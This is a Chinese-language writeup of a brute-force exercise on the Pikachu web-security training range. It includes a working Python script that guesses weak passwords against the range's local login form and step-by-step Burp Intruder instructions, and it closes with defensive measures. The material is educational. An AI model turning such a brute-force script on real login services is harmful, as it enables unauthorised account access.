基于表单的暴力破解 - Pikachu 靶场 Writeup

2026年9月17日 Pikachu 靶场 Web安全 暴力破解 Burp Suite

这是 Pikachu 靶场的第一关，也是我真正意义上第一次实践“暴力破解”。这个靶场极其特殊——它直接把账号密码写在提示框里，让我非常迷惑。本篇 Writeup 记录了我从“不知道要干嘛”到“用 Python 成功爆破”，以及“Burp Suite 抓包失败”的完整踩坑过程。

一、题目信息与靶场意图

  • 靶场名称：Pikachu - 暴力破解 - 基于表单的暴力破解
  • 题目类型：Web / 暴力破解 / 表单提交
  • 核心考点：学会使用抓包工具（Burp Suite）或编写 Python 脚本，利用字典对登录接口进行自动化猜解。

💡 为什么靶场直接给密码？ 因为 Pikachu 不是 CTF 比赛，它是一套教学演练场。出题人不想让你浪费时间在“猜密码”上，而是把答案（admin/123456）直接给你，让你专注于练习“如何用工具去验证这个密码”的过程。这就是“开卷考试”。

二、解题过程（详细步骤与试错全记录）

1. 踩坑第一步：Burp Suite 抓包抓不到 Pikachu 流量

我按照教程配置了 Burp 代理，开启了浏览器代理插件，并在 Pikachu 页面点击了“Login”。

结果： Burp 的 HTTP history 里全是 baidu.com 和 get.sogou.com 的请求，一条关于 Pikachu 的流量都没有。

原因分析： 浏览器默认会**绕过本地（Localhost / 127.0.0.1）的代理**。因为我的 Pikachu 地址写的是 localhost:xxxx，所以请求根本没经过 Burp，从后门溜走了。

2. 踩坑第二步：Python 脚本创建与运行报错

既然抓包一直失败，我决定使用 Python 脚本进行爆破（因为我之前已经在 CTFHub 上熟练掌握了 requests 库）。

我试图直接在终端里粘贴多行 Python 代码，导致文件没有正确创建，运行时报错：

can't open file '/Users/weiziyu/Downloads/pikachu_brute.py': [Errno 2] No such file or directory

原因： 终端没有正确执行 EOF，或者文件没有保存在当前的 Downloads 目录下。

3. 成功破局：用 Python 脚本完成自动化爆破

我使用终端命令 cat > pikachu_brute.py << 'EOF' 创建脚本，然后粘贴代码并输入 EOF 结束。在终端运行：

python3 pikachu_brute.py

终端成功打印出：🎉 爆破成功！密码: 123456。

这说明我的爆破逻辑完全正确！

三、最终使用的 Python 脚本（正确示范）

import requests

# ⚠️ 替换为真实的 Pikachu 靶场地址（注意端口）
url = "http://127.0.0.1:8080/pikachu/vul/burteforce/bf_form.php"

passwords = ["123456", "password", "admin", "admin888", "root", "111111", "12345678"]
username = "admin"

print("开始爆破 Pikachu 弱口令...")
for pwd in passwords:
    data = {"username": username, "password": pwd, "submit": "Login"}
    try:
        r = requests.post(url, data=data, timeout=3)
        # 靶场失败时会显示 "username or password is not exists~"
        # 只要不包含这个提示，就说明登录成功
        if "is not exists" not in r.text:
            print(f"\n🎉 爆破成功！密码: {pwd}")
            print(r.text[:500])
            break
        else:
            print(f"尝试: {username}:{pwd} -> 失败")
    except Exception as e:
        print(f"网络错误: {e}")

四、关于 Burp Suite 抓包失败的正确复盘

虽然我最终用 Python 解决了问题，但我必须搞清楚 Burp 为什么抓不到包。以下是正确的抓包姿势：

  • 正确访问地址： 如果靶场在本地，不要用 localhost，改用 127.0.0.1 或者局域网 IP（192.168.x.x），或者在 Chrome 的 chrome://flags 中关闭 localhost 绕过代理的设置。
  • 检查端口： 确保 Burp 的监听端口（如 8080）和浏览器代理设置的端口一致。如果 Pikachu 也占用了 8080，把 Burp 改成 8081。
  • 拦截开关： 确保 Intercept is off（灰色），否则请求会被卡住。
  • 正确流程： 在浏览器输入 admin/123456 点击登录 -> Burp 抓包 -> 右键 Send to Intruder -> 在 Positions 只给密码加标记 -> Payloads 加载字典 -> Start attack 观察 Length 差异。

五、知识点总结与防御思考

💡 暴力破解的本质： 利用大量字典在认证接口进行自动化尝试。它的成功取决于系统的防护强度（是否有限制、验证码、锁定机制）。

💡 防御手段： 1. 强制要求复杂密码；2. 增加图形验证码或手机 OTP；3. 限制登录失败次数或锁定账号/IP；4. 采用双因素认证（2FA）。

💡 工具选择： Burp Suite 适合精细化的单次抓包与改包，Python 脚本适合高并发、轻量级的自动化请求。在实战中，两者结合使用效率最高。
